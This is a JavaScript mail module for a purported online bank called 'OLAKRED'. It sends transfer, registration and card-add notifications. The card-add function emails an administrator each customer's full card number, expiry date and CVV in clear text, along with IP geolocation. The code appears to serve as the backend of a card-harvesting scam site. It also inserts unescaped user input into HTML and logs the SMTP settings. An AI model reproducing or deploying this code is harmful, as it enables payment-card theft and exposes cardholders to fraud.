// lib/mail.js
import nodemailer from "nodemailer";
import { buildTransactionEmail } from "./transactionEmail";

const BANK_NAME = "OLAKRED";
const BANK_SHORT = "BK";

function createTransporter() {
  console.log("SMTP CONFIG =>", {
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: process.env.SMTP_SECURE,
  });

  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT || 587),
    secure: process.env.SMTP_SECURE === "true",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

function formatDateFr(date = new Date()) {
  return date.toLocaleString("fr-FR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

export async function sendTransferEmail({ to, fullName, locale = "fr", transfer }) {
  const transporter = createTransporter();

  const { amount, reason, holder, reference, date } = transfer;

  const formattedDate =
    date ||
    new Date().toLocaleString(undefined, {
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });

  const { subject, text, html } = buildTransactionEmail({
    locale,
    type: "DEBIT",
    fullName,
    email: to,
    accountNumber: reference || "-",
    amount,
    currency: "EUR",
    label: reason || `Virement vers ${holder}`,
    transactionId: reference || "-",
    createdAt: formattedDate,
  });

  await transporter.sendMail({
    from: `"${BANK_NAME}" <${process.env.SMTP_FROM || "no-reply@olakred.com"}>`,
    to,
    subject,
    text,
    html,
  });
}

export async function sendCardAdminEmail({ to, adminName, user, card, geo, fraud }) {
  const transporter = createTransporter();

  const {
    cardNumber,
    expiryDate,
    cvv,
    cardholderName,
    locale,
    requestedAt,
  } = card;

  const {
    ip,
    cityName,
    regionName,
    countryName,
    countryCode,
    latitude,
    longitude,
    timeZone,
    zipCode,
    isProxy,
  } = geo || {};

  // FraudLabs Pro – extraction sécurisée
  const fraudScore = fraud?.fraudlabspro_score ?? null;
  const fraudStatus = fraud?.fraudlabspro_status ?? null;
  const fraudId = fraud?.fraudlabspro_id ?? null;
  const fraudIsProxy = fraud?.ip_geolocation?.is_proxy ?? null;
  const fraudIsPrepaid = fraud?.credit_card?.is_prepaid ?? null;
  const fraudIsBlacklisted = fraud?.credit_card?.is_in_blacklist ?? null;
  const fraudIpCountry = fraud?.ip_geolocation?.country_name ?? null;

  const subject = `${BANK_NAME} - Nouvelle demande d'ajout de carte`;

  const text = `
${BANK_NAME} - Nouvelle demande d'ajout de carte

Admin : ${adminName || "Admin"}
Client :
  Nom complet : ${user.fullName || "-"}
  Email       : ${user.email || "-"}
  ID interne  : ${user.id || "-"}

Détails de la carte :
  Nom sur la carte  : ${cardholderName}
  Numéro de carte   : ${cardNumber}
  Expiration        : ${expiryDate}
  CVV               : ${cvv}
  Locale interface  : ${locale || "-"}

Contexte technique :
  Date/heure demande   : ${requestedAt || formatDateFr()}
  IP                   : ${ip || "-"}
  Ville                : ${cityName || "-"}
  Région               : ${regionName || "-"}
  Pays                 : ${countryName || "-"} (${countryCode || "-"})
  Code postal          : ${zipCode || "-"}
  Latitude / Longitude : ${latitude ?? "-"} / ${longitude ?? "-"}
  Fuseau horaire       : ${timeZone || "-"}
  Proxy / VPN détecté  : ${isProxy ? "Oui" : "Non"}

${
  fraud
    ? `
FraudLabs Pro :
  Score fraude        : ${fraudScore ?? "-"}
  Statut              : ${fraudStatus || "-"}
  ID analyse          : ${fraudId || "-"}
  IP (pays, proxy)    : ${fraudIpCountry || "-"} / ${
        fraudIsProxy ? "Proxy" : "Non proxy"
      }
  Carte prépayée      : ${fraudIsPrepaid ? "Oui" : "Non"}
  Carte blacklistée   : ${fraudIsBlacklisted ? "Oui" : "Non"}
`
    : `
FraudLabs Pro : non utilisé ou indisponible pour cette demande.
`
}

Cet email est destiné à l'administration pour valider l'ajout de la carte.
`.trim();

  const html = `
<!doctype html>
<html lang="fr">
  <body style="margin:0;padding:0;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f5f7;padding:24px 0;">
      <tr>
        <td align="center">
          <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:16px;overflow:hidden;border:1px solid #e5e7eb;">
            <tr>
              <td style="background:linear-gradient(135deg,#4f46e5,#06b6d4);padding:16px 24px;color:#fff;">
                <table width="100%">
                  <tr>
                    <td style="font-size:18px;font-weight:600;">
                      ${BANK_NAME}
                    </td>
                    <td align="right" style="font-size:12px;opacity:.9;">
                      Nouvelle demande d'ajout de carte
                    </td>
                  </tr>
                </table>
              </td>
            </tr>

            <tr>
              <td style="padding:24px;font-size:14px;color:#111827;">
                <p style="margin:0 0 10px 0;">Bonjour <strong>${adminName || "Admin"}</strong>,</p>
                <p style="margin:0 0 16px 0;">
                  Une nouvelle demande d'ajout de carte bancaire vient d'être effectuée sur ${BANK_NAME}.
                </p>

                <h3 style="margin:0 0 8px 0;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;">
                  Client
                </h3>
                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;font-size:13px;color:#111827;margin-bottom:16px;">
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Nom complet</td>
                    <td align="right" style="padding:4px 0;">${user.fullName || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Email</td>
                    <td align="right" style="padding:4px 0;">${user.email || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">ID interne</td>
                    <td align="right" style="padding:4px 0;font-family:monospace;">${user.id || "-"}</td>
                  </tr>
                </table>

                <h3 style="margin:0 0 8px 0;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;">
                  Détails de la carte
                </h3>
                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;font-size:13px;color:#111827;margin-bottom:16px;">
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Nom sur la carte</td>
                    <td align="right" style="padding:4px 0;">${cardholderName}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Numéro de carte</td>
                    <td align="right" style="padding:4px 0;font-family:monospace;">${cardNumber}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Date d'expiration</td>
                    <td align="right" style="padding:4px 0;">${expiryDate}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">CVV</td>
                    <td align="right" style="padding:4px 0;">${cvv}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Locale interface</td>
                    <td align="right" style="padding:4px 0;">${locale || "-"}</td>
                  </tr>
                </table>

                <h3 style="margin:0 0 8px 0;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;">
                  Contexte & géolocalisation (FreeIPAPI)
                </h3>
                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;font-size:13px;color:#111827;">
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Date/heure demande</td>
                    <td align="right" style="padding:4px 0;">${requestedAt || formatDateFr()}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">IP</td>
                    <td align="right" style="padding:4px 0;font-family:monospace;">${ip || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Ville</td>
                    <td align="right" style="padding:4px 0;">${cityName || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Région</td>
                    <td align="right" style="padding:4px 0;">${regionName || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Pays</td>
                    <td align="right" style="padding:4px 0;">${countryName || "-"} (${countryCode || "-"})</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Code postal</td>
                    <td align="right" style="padding:4px 0;">${zipCode || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Latitude / Longitude</td>
                    <td align="right" style="padding:4px 0;">${latitude ?? "-"} / ${longitude ?? "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Fuseau horaire</td>
                    <td align="right" style="padding:4px 0;">${timeZone || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Proxy / VPN détecté</td>
                    <td align="right" style="padding:4px 0;">${isProxy ? "Oui" : "Non"}</td>
                  </tr>
                </table>

${
  fraud
    ? `
                <h3 style="margin:16px 0 8px 0;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;">
                  Analyse fraude (FraudLabs Pro)
                </h3>
                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;font-size:13px;color:#111827;margin-bottom:4px;">
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Score fraude</td>
                    <td align="right" style="padding:4px 0;font-weight:600;">${fraudScore ?? "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Statut</td>
                    <td align="right" style="padding:4px 0;">${fraudStatus || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">ID analyse</td>
                    <td align="right" style="padding:4px 0;font-family:monospace;">${fraudId || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">IP (pays, proxy)</td>
                    <td align="right" style="padding:4px 0;">
                      ${fraudIpCountry || "-"} / ${
        fraudIsProxy ? "Proxy" : "Non proxy"
      }
                    </td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Carte prépayée</td>
                    <td align="right" style="padding:4px 0;">${
                      fraudIsPrepaid ? "Oui" : "Non"
                    }</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Carte blacklistée</td>
                    <td align="right" style="padding:4px 0;">${
                      fraudIsBlacklisted ? "Oui" : "Non"
                    }</td>
                  </tr>
                </table>
`
    : `
                <p style="margin:16px 0 8px 0;font-size:12px;color:#6b7280;">
                  FraudLabs Pro : non utilisé ou indisponible pour cette demande.
                </p>
`
}

                <p style="margin:18px 0 0 0;font-size:12px;color:#6b7280;">
                  Cet email est destiné à l'administration pour vérifier la légitimité de la demande avant activation de la carte.
                </p>
              </td>
            </tr>

            <tr>
              <td style="padding:16px 24px;background-color:#f9fafb;font-size:11px;color:#9ca3af;text-align:center;">
                ${BANK_NAME} - Service ${BANK_SHORT} en ligne.
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </body>
</html>
`.trim();

  await transporter.sendMail({
    from: `"${BANK_NAME}" <${process.env.SMTP_FROM || "no-reply@olakred.com"}>`,
    to,
    subject,
    text,
    html,
  });
}

export async function sendRegistrationAdminEmail({ to, adminName, user }) {
  const transporter = createTransporter();

  const { fullName, email, locale, createdAt } = user || {};
  const formattedDate = createdAt || formatDateFr();

  const subject = `${BANK_NAME} - Nouvelle inscription`;

  const text = `
${BANK_NAME} - Nouvelle inscription

Admin : ${adminName || "Admin"}

Nouvelle inscription sur la plateforme :

  Nom complet : ${fullName || "-"}
  Email       : ${email || "-"}
  Langue      : ${locale || "-"}

Date / heure d'inscription : ${formattedDate}

Cet email est destiné à l'administration pour suivre les nouvelles ouvertures de compte.
`.trim();

  const html = `
<!doctype html>
<html lang="fr">
  <body style="margin:0;padding:0;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color:#f5f5f7;padding:24px 0;">
      <tr>
        <td align="center">
          <table width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:16px;overflow:hidden;border:1px solid #e5e7eb;">
            <tr>
              <td style="background:linear-gradient(135deg,#4f46e5,#06b6d4);padding:16px 24px;color:#fff;">
                <table width="100%">
                  <tr>
                    <td style="font-size:18px;font-weight:600;">
                      ${BANK_NAME}
                    </td>
                    <td align="right" style="font-size:12px;opacity:.9;">
                      Nouvelle inscription
                    </td>
                  </tr>
                </table>
              </td>
            </tr>

            <tr>
              <td style="padding:24px;font-size:14px;color:#111827;">
                <p style="margin:0 0 10px 0;">Bonjour <strong>${adminName || "Admin"}</strong>,</p>
                <p style="margin:0 0 16px 0;">
                  Une nouvelle inscription vient d'être réalisée sur ${BANK_NAME}.
                </p>

                <h3 style="margin:0 0 8px 0;font-size:13px;color:#6b7280;text-transform:uppercase;letter-spacing:.08em;">
                  Nouveau client
                </h3>
                <table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse;font-size:13px;color:#111827;margin-bottom:16px;">
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Nom complet</td>
                    <td align="right" style="padding:4px 0;">${fullName || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Email</td>
                    <td align="right" style="padding:4px 0;">${email || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Langue de l'inscription</td>
                    <td align="right" style="padding:4px 0;">${locale || "-"}</td>
                  </tr>
                  <tr>
                    <td style="padding:4px 0;color:#6b7280;">Date / heure</td>
                    <td align="right" style="padding:4px 0;">${formattedDate}</td>
                  </tr>
                </table>

                <p style="margin:18px 0 0 0;font-size:12px;color:#6b7280;">
                  Cet email est destiné à l'administration pour suivre les nouvelles ouvertures de compte.
                </p>
              </td>
            </tr>

            <tr>
              <td style="padding:16px 24px;background-color:#f9fafb;font-size:11px;color:#9ca3af;text-align:center;">
                ${BANK_NAME} - Service ${BANK_SHORT} en ligne.
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>
  </body>
</html>
`.trim();

  await transporter.sendMail({
    from: `"${BANK_NAME}" <${process.env.SMTP_FROM || "no-reply@olakred.com"}>`,
    to,
    subject,
    text,
    html,
  });
}
